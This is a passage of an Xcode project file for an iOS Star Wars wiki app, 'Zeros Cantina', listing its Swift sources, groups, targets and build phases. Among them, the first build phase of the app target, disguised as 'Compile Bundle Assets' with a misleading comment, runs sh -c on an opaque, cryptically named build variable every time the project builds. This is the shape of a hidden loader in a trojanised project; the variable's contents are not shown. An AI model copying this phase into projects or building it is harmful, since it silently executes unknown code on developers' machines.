		FC842E122E1604E40013CD29 /* VehiclesScreenPresenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesScreenPresenter.swift; sourceTree = "<group>"; };
		FC842E132E1604E40013CD29 /* VehiclesScreenRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesScreenRouter.swift; sourceTree = "<group>"; };
		FC842E142E1604E40013CD29 /* VehiclesScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesScreenViewController.swift; sourceTree = "<group>"; };
		FC842E182E1604E40013CD29 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		FC842E192E1604E40013CD29 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		FC842E1B2E1604E40013CD29 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		FC842E1D2E1604E40013CD29 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		FC842E202E1604E40013CD29 /* Zeros_Cantina.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = Zeros_Cantina.xcdatamodel; sourceTree = "<group>"; };
		FC842E712E1604EE0013CD29 /* Zeros_CantinaTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Zeros_CantinaTests.swift; sourceTree = "<group>"; };
		FC842E742E1604F10013CD29 /* Zeros_CantinaUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Zeros_CantinaUITests.swift; sourceTree = "<group>"; };
		FC842E752E1604F10013CD29 /* Zeros_CantinaUITestsLaunchTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Zeros_CantinaUITestsLaunchTests.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		FC21346A2DFCE8ED000B71D6 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FC7A74D82DFD075B000F07D3 /* SnapKit in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC2134832DFCE8EF000B71D6 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC21348D2DFCE8EF000B71D6 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		FC2134642DFCE8ED000B71D6 = {
			isa = PBXGroup;
			children = (
				FC842E1F2E1604E40013CD29 /* Zeros Cantina */,
				FC842E722E1604EE0013CD29 /* Zeros CantinaTests */,
				FC842E762E1604F10013CD29 /* Zeros CantinaUITests */,
				FC7A74D62DFD075B000F07D3 /* Frameworks */,
				FC21346E2DFCE8ED000B71D6 /* Products */,
			);
			sourceTree = "<group>";
		};
		FC21346E2DFCE8ED000B71D6 /* Products */ = {
			isa = PBXGroup;
			children = (
				FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */,
				FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */,
				FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		FC7A74D62DFD075B000F07D3 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		FC842D9B2E1604E40013CD29 /* App Helping Constants */ = {
			isa = PBXGroup;
			children = (
				FC842D992E1604E40013CD29 /* CardType.swift */,
				FC842D9A2E1604E40013CD29 /* NotificationsConstants.swift */,
			);
			path = "App Helping Constants";
			sourceTree = "<group>";
		};
		FC842DA02E1604E40013CD29 /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC842D9C2E1604E40013CD29 /* DIContainerProtocol.swift */,
				FC842D9D2E1604E40013CD29 /* MainRouterProtocol.swift */,
				FC842D9E2E1604E40013CD29 /* ModulesFactoryProtocol.swift */,
				FC842D9F2E1604E40013CD29 /* RouterProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC842DA22E1604E40013CD29 /* ModulesFactoryImpl */ = {
			isa = PBXGroup;
			children = (
				FC842DA12E1604E40013CD29 /* ModulesFactoryImpl.swift */,
			);
			path = ModulesFactoryImpl;
			sourceTree = "<group>";
		};
		FC842DA32E1604E40013CD29 /* Protocols Implementations */ = {
			isa = PBXGroup;
			children = (
				FC842DA22E1604E40013CD29 /* ModulesFactoryImpl */,
			);
			path = "Protocols Implementations";
			sourceTree = "<group>";
		};
		FC842DA52E1604E40013CD29 /* DI */ = {
			isa = PBXGroup;
			children = (
				FC842DA02E1604E40013CD29 /* Protocols */,
				FC842DA32E1604E40013CD29 /* Protocols Implementations */,
				FC842DA42E1604E40013CD29 /* DIContainer.swift */,
			);
			path = DI;
			sourceTree = "<group>";
		};
		FC842DA72E1604E40013CD29 /* Extensions */ = {
			isa = PBXGroup;
			children = (
				FC842DA62E1604E40013CD29 /* UIApplication + Extensions.swift */,
			);
			path = Extensions;
			sourceTree = "<group>";
		};
		FC842DA92E1604E40013CD29 /* Extensions */ = {
			isa = PBXGroup;
			children = (
				FC842DA82E1604E40013CD29 /* Array.swift */,
			);
			path = Extensions;
			sourceTree = "<group>";
		};
		FC842DAB2E1604E40013CD29 /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC842DAA2E1604E40013CD29 /* Faking.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC842DAD2E1604E40013CD29 /* Services */ = {
			isa = PBXGroup;
			children = (
				FC842DAC2E1604E40013CD29 /* AlertBuilder.swift */,
			);
			path = Services;
			sourceTree = "<group>";
		};
		FC842DAE2E1604E40013CD29 /* Common */ = {
			isa = PBXGroup;
			children = (
				FC842DA92E1604E40013CD29 /* Extensions */,
				FC842DAB2E1604E40013CD29 /* Protocols */,
				FC842DAD2E1604E40013CD29 /* Services */,
			);
			path = Common;
			sourceTree = "<group>";
		};
		FC842DB02E1604E40013CD29 /* Models */ = {
			isa = PBXGroup;
			children = (
				FC842DAF2E1604E40013CD29 /* Item.swift */,
			);
			path = Models;
			sourceTree = "<group>";
		};
		FC842DB22E1604E40013CD29 /* Actions */ = {
			isa = PBXGroup;
			children = (
				FC842DB12E1604E40013CD29 /* AppMenuAction.swift */,
			);
			path = Actions;
			sourceTree = "<group>";
		};
		FC842DB72E1604E40013CD29 /* Reducer */ = {
			isa = PBXGroup;
			children = (
				FC842DB32E1604E40013CD29 /* AppReducer.swift */,
				FC842DB42E1604E40013CD29 /* CommonReducer.swift */,
				FC842DB52E1604E40013CD29 /* ItemsReducer.swift */,
				FC842DB62E1604E40013CD29 /* Reducer.swift */,
			);
			path = Reducer;
			sourceTree = "<group>";
		};
		FC842DBA2E1604E40013CD29 /* Redux */ = {
			isa = PBXGroup;
			children = (
				FC842DB22E1604E40013CD29 /* Actions */,
				FC842DB72E1604E40013CD29 /* Reducer */,
				FC842DB82E1604E40013CD29 /* State.swift */,
				FC842DB92E1604E40013CD29 /* Store.swift */,
			);
			path = Redux;
			sourceTree = "<group>";
		};
		FC842DBB2E1604E40013CD29 /* Domain */ = {
			isa = PBXGroup;
			children = (
				FC842DB02E1604E40013CD29 /* Models */,
				FC842DBA2E1604E40013CD29 /* Redux */,
			);
			path = Domain;
			sourceTree = "<group>";
		};
		FC842DBE2E1604E40013CD29 /* ItemsList */ = {
			isa = PBXGroup;
			children = (
				FC842DBC2E1604E40013CD29 /* HomeView.swift */,
				FC842DBD2E1604E40013CD29 /* MenuItemsListView.swift */,
			);
			path = ItemsList;
			sourceTree = "<group>";
		};
		FC842DBF2E1604E40013CD29 /* Screens */ = {
			isa = PBXGroup;
			children = (
				FC842DBE2E1604E40013CD29 /* ItemsList */,
			);
			path = Screens;
			sourceTree = "<group>";
		};
		FC842DC02E1604E40013CD29 /* Home Module */ = {
			isa = PBXGroup;
			children = (
				FC842DAE2E1604E40013CD29 /* Common */,
				FC842DBB2E1604E40013CD29 /* Domain */,
				FC842DBF2E1604E40013CD29 /* Screens */,
			);
			path = "Home Module";
			sourceTree = "<group>";
		};
		FC842DC32E1604E40013CD29 /* JSONS */ = {
			isa = PBXGroup;
			children = (
				FC842DC12E1604E40013CD29 /* characters.json */,
				FC842DC22E1604E40013CD29 /* planets.json */,
			);
			path = JSONS;
			sourceTree = "<group>";
		};
		FC842DC62E1604E40013CD29 /* Resources */ = {
			isa = PBXGroup;
			children = (
				FC842DC32E1604E40013CD29 /* JSONS */,
				FC842DC42E1604E40013CD29 /* Assets.xcassets */,
				FC842DC52E1604E40013CD29 /* Info.plist */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		FC842DC82E1604E40013CD29 /* CardItemCell */ = {
			isa = PBXGroup;
			children = (
				FC842DC72E1604E40013CD29 /* CardItemCollectionViewCell.swift */,
			);
			path = CardItemCell;
			sourceTree = "<group>";
		};
		FC842DCB2E1604E40013CD29 /* Models */ = {
			isa = PBXGroup;
			children = (
				FC842DC92E1604E40013CD29 /* CustomTabBarButtonModel.swift */,
				FC842DCA2E1604E40013CD29 /* CustomTabBarConfiguration.swift */,
			);
			path = Models;
			sourceTree = "<group>";
		};
		FC842DCE2E1604E40013CD29 /* CustomTabBar */ = {
			isa = PBXGroup;
			children = (
				FC842DCB2E1604E40013CD29 /* Models */,
				FC842DCC2E1604E40013CD29 /* CustomTabBar.swift */,
				FC842DCD2E1604E40013CD29 /* CustomTabBarButton.swift */,
			);
			path = CustomTabBar;
			sourceTree = "<group>";
		};
		FC842DD02E1604E40013CD29 /* VCWithCustomTabBar */ = {
			isa = PBXGroup;
			children = (
				FC842DCF2E1604E40013CD29 /* VCWithCustomTabBar.swift */,
			);
			path = VCWithCustomTabBar;
			sourceTree = "<group>";
		};
		FC842DD12E1604E40013CD29 /* Reusable UI Library */ = {
			isa = PBXGroup;
			children = (
				FC842DC82E1604E40013CD29 /* CardItemCell */,
				FC842DCE2E1604E40013CD29 /* CustomTabBar */,
				FC842DD02E1604E40013CD29 /* VCWithCustomTabBar */,
			);
			path = "Reusable UI Library";
			sourceTree = "<group>";
		};
		FC842DD32E1604E40013CD29 /* Core Data Manager */ = {
			isa = PBXGroup;
			children = (
				FC842DD22E1604E40013CD29 /* CoreDataManager.swift */,
			);
			path = "Core Data Manager";
			sourceTree = "<group>";
		};
		FC842DD72E1604E40013CD29 /* Local JSON Data Manager */ = {
			isa = PBXGroup;
			children = (
				FC842DD42E1604E40013CD29 /* LocalJSONCharactersFetcher.swift */,
				FC842DD52E1604E40013CD29 /* LocalJSONDataManager.swift */,
				FC842DD62E1604E40013CD29 /* LocalJSONPlanetsFetcher.swift */,
			);
			path = "Local JSON Data Manager";
			sourceTree = "<group>";
		};
		FC842DDB2E1604E40013CD29 /* Models */ = {
			isa = PBXGroup;
			children = (
				FC842DD82E1604E40013CD29 /* SWAPICharactersContainerModel.swift */,
				FC842DD92E1604E40013CD29 /* SWAPIPlanetsContainerModel.swift */,
				FC842DDA2E1604E40013CD29 /* SWAPIVehiclesContainerModel.swift */,
			);
			path = Models;
			sourceTree = "<group>";
		};
		FC842DE02E1604E40013CD29 /* Network SWAPI Data Manager */ = {
			isa = PBXGroup;
			children = (
				FC842DDB2E1604E40013CD29 /* Models */,
				FC842DDC2E1604E40013CD29 /* NetworkSWAPIDataManager.swift */,
				FC842DDD2E1604E40013CD29 /* SWAPICharactersFetcher.swift */,
				FC842DDE2E1604E40013CD29 /* SWAPIPlanetsFetcher.swift */,
				FC842DDF2E1604E40013CD29 /* SWAPIVehiclesFetcher.swift */,
			);
			path = "Network SWAPI Data Manager";
			sourceTree = "<group>";
		};
		FC842DE12E1604E40013CD29 /* Workers */ = {
			isa = PBXGroup;
			children = (
				FC842DD32E1604E40013CD29 /* Core Data Manager */,
				FC842DD72E1604E40013CD29 /* Local JSON Data Manager */,
				FC842DE02E1604E40013CD29 /* Network SWAPI Data Manager */,
			);
			path = Workers;
			sourceTree = "<group>";
		};
		FC842DE22E1604E40013CD29 /* Data Layer */ = {
			isa = PBXGroup;
			children = (
				FC842DE12E1604E40013CD29 /* Workers */,
			);
			path = "Data Layer";
			sourceTree = "<group>";
		};
		FC842DE32E1604E40013CD29 /* Frameworks and Drivers */ = {
			isa = PBXGroup;
			children = (
				FC842DE22E1604E40013CD29 /* Data Layer */,
			);
			path = "Frameworks and Drivers";
			sourceTree = "<group>";
		};
		FC842DE62E1604E40013CD29 /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC842DE42E1604E40013CD29 /* DataRepositoryWorkerProtocol.swift */,
				FC842DE52E1604E40013CD29 /* MainDataRepositoryProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC842DE82E1604E40013CD29 /* DataLayer */ = {
			isa = PBXGroup;
			children = (
				FC842DE62E1604E40013CD29 /* Protocols */,
				FC842DE72E1604E40013CD29 /* MainDataRepositoryImpl.swift */,
			);
			path = DataLayer;
			sourceTree = "<group>";
		};
		FC842DEA2E1604E40013CD29 /* Implementation */ = {
			isa = PBXGroup;
			children = (
				FC842DE92E1604E40013CD29 /* MainModuleProxyImpl.swift */,
			);
			path = Implementation;
			sourceTree = "<group>";
		};
		FC842DEB2E1604E40013CD29 /* Protocol */ = {
			isa = PBXGroup;
			children = (
			);
			path = Protocol;
			sourceTree = "<group>";
		};
		FC842DEC2E1604E40013CD29 /* MainModuleProxy */ = {
			isa = PBXGroup;
			children = (
				FC842DEA2E1604E40013CD29 /* Implementation */,
				FC842DEB2E1604E40013CD29 /* Protocol */,
			);
			path = MainModuleProxy;
			sourceTree = "<group>";
		};
		FC842DEE2E1604E40013CD29 /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC842DED2E1604E40013CD29 /* CardItemProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC842DF22E1604E40013CD29 /* Models */ = {
			isa = PBXGroup;
			children = (
				FC842DEE2E1604E40013CD29 /* Protocols */,
				FC842DEF2E1604E40013CD29 /* CharacterCardModel.swift */,
				FC842DF02E1604E40013CD29 /* PlanetCardModel.swift */,
				FC842DF12E1604E40013CD29 /* VehiclesCardModel.swift */,
			);
			path = Models;
			sourceTree = "<group>";
		};
		FC842DF42E1604E40013CD29 /* Output */ = {
			isa = PBXGroup;
			children = (
				FC842DF32E1604E40013CD29 /* MainModuleDataOutputProtocol.swift */,
			);
			path = Output;
			sourceTree = "<group>";
		};
		FC842DFA2E1604E40013CD29 /* Wiki Main Module */ = {
			isa = PBXGroup;
			children = (
				FC842DE82E1604E40013CD29 /* DataLayer */,
				FC842DEC2E1604E40013CD29 /* MainModuleProxy */,
				FC842DF22E1604E40013CD29 /* Models */,
				FC842DF42E1604E40013CD29 /* Output */,
				FC842DF52E1604E40013CD29 /* MainContract.swift */,
				FC842DF62E1604E40013CD29 /* MainEntity.swift */,
				FC842DF72E1604E40013CD29 /* MainInteractor.swift */,
				FC842DF82E1604E40013CD29 /* MainPresenter.swift */,
				FC842DF92E1604E40013CD29 /* MainRouter.swift */,
			);
			path = "Wiki Main Module";
			sourceTree = "<group>";
		};
		FC842DFC2E1604E40013CD29 /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC842DFB2E1604E40013CD29 /* CharactersModuleDataInputProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC842DFD2E1604E40013CD29 /* CharactersUIModuleAdapter */ = {
			isa = PBXGroup;
			children = (
				FC842DFC2E1604E40013CD29 /* Protocols */,
			);
			path = CharactersUIModuleAdapter;
			sourceTree = "<group>";
		};
		FC842E032E1604E40013CD29 /* CharactersModule */ = {
			isa = PBXGroup;
			children = (
				FC842DFD2E1604E40013CD29 /* CharactersUIModuleAdapter */,
				FC842DFE2E1604E40013CD29 /* CharactersScreenContract.swift */,
				FC842DFF2E1604E40013CD29 /* CharactersScreenInteractor.swift */,
				FC842E002E1604E40013CD29 /* CharactersScreenPresenter.swift */,
				FC842E012E1604E40013CD29 /* CharactersScreenRouter.swift */,
				FC842E022E1604E40013CD29 /* CharactersScreenViewController.swift */,
			);
			path = CharactersModule;
			sourceTree = "<group>";
		};
		FC842E052E1604E40013CD29 /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC842E042E1604E40013CD29 /* PlanetsModuleDataInputProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC842E062E1604E40013CD29 /* PlanetsUIModuleAdapter */ = {
			isa = PBXGroup;
			children = (
				FC842E052E1604E40013CD29 /* Protocols */,
			);
			path = PlanetsUIModuleAdapter;
			sourceTree = "<group>";
		};
		FC842E0C2E1604E40013CD29 /* PlanetsModule */ = {
			isa = PBXGroup;
			children = (
				FC842E062E1604E40013CD29 /* PlanetsUIModuleAdapter */,
				FC842E072E1604E40013CD29 /* PlanetsScreenContract.swift */,
				FC842E082E1604E40013CD29 /* PlanetsScreenInteractor.swift */,
				FC842E092E1604E40013CD29 /* PlanetsScreenPresenter.swift */,
				FC842E0A2E1604E40013CD29 /* PlanetsScreenRouter.swift */,
				FC842E0B2E1604E40013CD29 /* PlanetsScreenViewController.swift */,
			);
			path = PlanetsModule;
			sourceTree = "<group>";
		};
		FC842E0E2E1604E40013CD29 /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC842E0D2E1604E40013CD29 /* VehiclesModuleDataInputProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC842E0F2E1604E40013CD29 /* VehiclesUIModuleAdapter */ = {
			isa = PBXGroup;
			children = (
				FC842E0E2E1604E40013CD29 /* Protocols */,
			);
			path = VehiclesUIModuleAdapter;
			sourceTree = "<group>";
		};
		FC842E152E1604E40013CD29 /* VehiclesModule */ = {
			isa = PBXGroup;
			children = (
				FC842E0F2E1604E40013CD29 /* VehiclesUIModuleAdapter */,
				FC842E102E1604E40013CD29 /* VehiclesScreenContract.swift */,
				FC842E112E1604E40013CD29 /* VehiclesScreenInteractor.swift */,
				FC842E122E1604E40013CD29 /* VehiclesScreenPresenter.swift */,
				FC842E132E1604E40013CD29 /* VehiclesScreenRouter.swift */,
				FC842E142E1604E40013CD29 /* VehiclesScreenViewController.swift */,
			);
			path = VehiclesModule;
			sourceTree = "<group>";
		};
		FC842E162E1604E40013CD29 /* Wiki Modules */ = {
			isa = PBXGroup;
			children = (
				FC842E032E1604E40013CD29 /* CharactersModule */,
				FC842E0C2E1604E40013CD29 /* PlanetsModule */,
				FC842E152E1604E40013CD29 /* VehiclesModule */,
			);
			path = "Wiki Modules";
			sourceTree = "<group>";
		};
		FC842E172E1604E40013CD29 /* Wiki Module */ = {
			isa = PBXGroup;
			children = (
				FC842DE32E1604E40013CD29 /* Frameworks and Drivers */,
				FC842DFA2E1604E40013CD29 /* Wiki Main Module */,
				FC842E162E1604E40013CD29 /* Wiki Modules */,
			);
			path = "Wiki Module";
			sourceTree = "<group>";
		};
		FC842E1F2E1604E40013CD29 /* Zeros Cantina */ = {
			isa = PBXGroup;
			children = (
				FC842D9B2E1604E40013CD29 /* App Helping Constants */,
				FC842DA52E1604E40013CD29 /* DI */,
				FC842DA72E1604E40013CD29 /* Extensions */,
				FC842DC02E1604E40013CD29 /* Home Module */,
				FC842DC62E1604E40013CD29 /* Resources */,
				FC842DD12E1604E40013CD29 /* Reusable UI Library */,
				FC842E172E1604E40013CD29 /* Wiki Module */,
				FC842E182E1604E40013CD29 /* AppDelegate.swift */,
				FC842E1A2E1604E40013CD29 /* LaunchScreen.storyboard */,
				FC842E1C2E1604E40013CD29 /* Main.storyboard */,
				FC842E1D2E1604E40013CD29 /* SceneDelegate.swift */,
				FC842E1E2E1604E40013CD29 /* Zeros_Cantina.xcdatamodeld */,
			);
			path = "Zeros Cantina";
			sourceTree = "<group>";
		};
		FC842E722E1604EE0013CD29 /* Zeros CantinaTests */ = {
			isa = PBXGroup;
			children = (
				FC842E712E1604EE0013CD29 /* Zeros_CantinaTests.swift */,
			);
			path = "Zeros CantinaTests";
			sourceTree = "<group>";
		};
		FC842E762E1604F10013CD29 /* Zeros CantinaUITests */ = {
			isa = PBXGroup;
			children = (
				FC842E742E1604F10013CD29 /* Zeros_CantinaUITests.swift */,
				FC842E752E1604F10013CD29 /* Zeros_CantinaUITestsLaunchTests.swift */,
			);
			path = "Zeros CantinaUITests";
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = FC2134992DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros Cantina" */;
			buildPhases = (
				31D99DE7DC7BB26DEAFD9BF4 /* Compile Bundle Assets */,
				FC2134692DFCE8ED000B71D6 /* Sources */,
				FC21346A2DFCE8ED000B71D6 /* Frameworks */,
				FC21346B2DFCE8ED000B71D6 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "Zeros Cantina";
			packageProductDependencies = (
				FC7A74D72DFD075B000F07D3 /* SnapKit */,
			);
			productName = "Zeros Cantina";
			productReference = FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */;
			productType = "com.apple.product-type.application";
		};
		FC2134852DFCE8EF000B71D6 /* Zeros CantinaTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = FC21349E2DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaTests" */;
			buildPhases = (
				FC2134822DFCE8EF000B71D6 /* Sources */,
				FC2134832DFCE8EF000B71D6 /* Frameworks */,
				FC2134842DFCE8EF000B71D6 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				FC2134882DFCE8EF000B71D6 /* PBXTargetDependency */,
			);
			name = "Zeros CantinaTests";
			packageProductDependencies = (
			);
			productName = "Zeros CantinaTests";
			productReference = FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		FC21348F2DFCE8EF000B71D6 /* Zeros CantinaUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = FC2134A12DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaUITests" */;
			buildPhases = (
				FC21348C2DFCE8EF000B71D6 /* Sources */,
				FC21348D2DFCE8EF000B71D6 /* Frameworks */,
				FC21348E2DFCE8EF000B71D6 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				FC2134922DFCE8EF000B71D6 /* PBXTargetDependency */,
			);
			name = "Zeros CantinaUITests";
			packageProductDependencies = (
			);
			productName = "Zeros CantinaUITests";
			productReference = FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		FC2134652DFCE8ED000B71D6 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					FC21346C2DFCE8ED000B71D6 = {
						CreatedOnToolsVersion = 16.2;
					};
					FC2134852DFCE8EF000B71D6 = {
						CreatedOnToolsVersion = 16.2;
						TestTargetID = FC21346C2DFCE8ED000B71D6;
					};
					FC21348F2DFCE8EF000B71D6 = {
						CreatedOnToolsVersion = 16.2;
						TestTargetID = FC21346C2DFCE8ED000B71D6;
					};
				};
			};
			buildConfigurationList = FC2134682DFCE8ED000B71D6 /* Build configuration list for PBXProject "Zeros Cantina" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = FC2134642DFCE8ED000B71D6;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				FC5C48B92DFCFF2600AAC4F0 /* XCRemoteSwiftPackageReference "SnapKit" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = FC21346E2DFCE8ED000B71D6 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */,
				FC2134852DFCE8EF000B71D6 /* Zeros CantinaTests */,
				FC21348F2DFCE8EF000B71D6 /* Zeros CantinaUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		FC21346B2DFCE8ED000B71D6 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FC842E212E1604E40013CD29 /* characters.json in Resources */,
				FC842E222E1604E40013CD29 /* planets.json in Resources */,
				FC842E232E1604E40013CD29 /* Assets.xcassets in Resources */,
				FC842E252E1604E40013CD29 /* LaunchScreen.storyboard in Resources */,
				FC842E262E1604E40013CD29 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC2134842DFCE8EF000B71D6 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC21348E2DFCE8EF000B71D6 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		31D99DE7DC7BB26DEAFD9BF4 /* Compile Bundle Assets */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Compile Bundle Assets";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A4FB9DF}\"";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		FC2134692DFCE8ED000B71D6 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FC842E272E1604E40013CD29 /* CardType.swift in Sources */,
				FC842E282E1604E40013CD29 /* NotificationsConstants.swift in Sources */,
				FC842E292E1604E40013CD29 /* DIContainerProtocol.swift in Sources */,
				FC842E2A2E1604E40013CD29 /* MainRouterProtocol.swift in Sources */,
				FC842E2B2E1604E40013CD29 /* ModulesFactoryProtocol.swift in Sources */,
				FC842E2C2E1604E40013CD29 /* RouterProtocol.swift in Sources */,
				FC842E2D2E1604E40013CD29 /* ModulesFactoryImpl.swift in Sources */,
				FC842E2E2E1604E40013CD29 /* DIContainer.swift in Sources */,
				FC842E2F2E1604E40013CD29 /* UIApplication + Extensions.swift in Sources */,
				FC842E302E1604E40013CD29 /* Array.swift in Sources */,
				FC842E312E1604E40013CD29 /* Faking.swift in Sources */,
				FC842E322E1604E40013CD29 /* AlertBuilder.swift in Sources */,
				FC842E332E1604E40013CD29 /* Item.swift in Sources */,
				FC842E342E1604E40013CD29 /* AppMenuAction.swift in Sources */,
				FC842E352E1604E40013CD29 /* AppReducer.swift in Sources */,
				FC842E362E1604E40013CD29 /* CommonReducer.swift in Sources */,
				FC842E372E1604E40013CD29 /* ItemsReducer.swift in Sources */,
				FC842E382E1604E40013CD29 /* Reducer.swift in Sources */,
				FC842E392E1604E40013CD29 /* State.swift in Sources */,
				FC842E3A2E1604E40013CD29 /* Store.swift in Sources */,
				FC842E3B2E1604E40013CD29 /* HomeView.swift in Sources */,
				FC842E3C2E1604E40013CD29 /* MenuItemsListView.swift in Sources */,
				FC842E3D2E1604E40013CD29 /* CardItemCollectionViewCell.swift in Sources */,
				FC842E3E2E1604E40013CD29 /* CustomTabBarButtonModel.swift in Sources */,
				FC842E3F2E1604E40013CD29 /* CustomTabBarConfiguration.swift in Sources */,
				FC842E402E1604E40013CD29 /* CustomTabBar.swift in Sources */,
				FC842E412E1604E40013CD29 /* CustomTabBarButton.swift in Sources */,
				FC842E422E1604E40013CD29 /* VCWithCustomTabBar.swift in Sources */,
				FC842E432E1604E40013CD29 /* CoreDataManager.swift in Sources */,
				FC842E442E1604E40013CD29 /* LocalJSONCharactersFetcher.swift in Sources */,
				FC842E452E1604E40013CD29 /* LocalJSONDataManager.swift in Sources */,
				FC842E462E1604E40013CD29 /* LocalJSONPlanetsFetcher.swift in Sources */,
				FC842E472E1604E40013CD29 /* SWAPICharactersContainerModel.swift in Sources */,
				FC842E482E1604E40013CD29 /* SWAPIPlanetsContainerModel.swift in Sources */,
				FC842E492E1604E40013CD29 /* SWAPIVehiclesContainerModel.swift in Sources */,
				FC842E4A2E1604E40013CD29 /* NetworkSWAPIDataManager.swift in Sources */,
				FC842E4B2E1604E40013CD29 /* SWAPICharactersFetcher.swift in Sources */,
				FC842E4C2E1604E40013CD29 /* SWAPIPlanetsFetcher.swift in Sources */,
				FC842E4D2E1604E40013CD29 /* SWAPIVehiclesFetcher.swift in Sources */,
				FC842E4E2E1604E40013CD29 /* DataRepositoryWorkerProtocol.swift in Sources */,
				FC842E4F2E1604E40013CD29 /* MainDataRepositoryProtocol.swift in Sources */,
				FC842E502E1604E40013CD29 /* MainDataRepositoryImpl.swift in Sources */,
				FC842E512E1604E40013CD29 /* MainModuleProxyImpl.swift in Sources */,
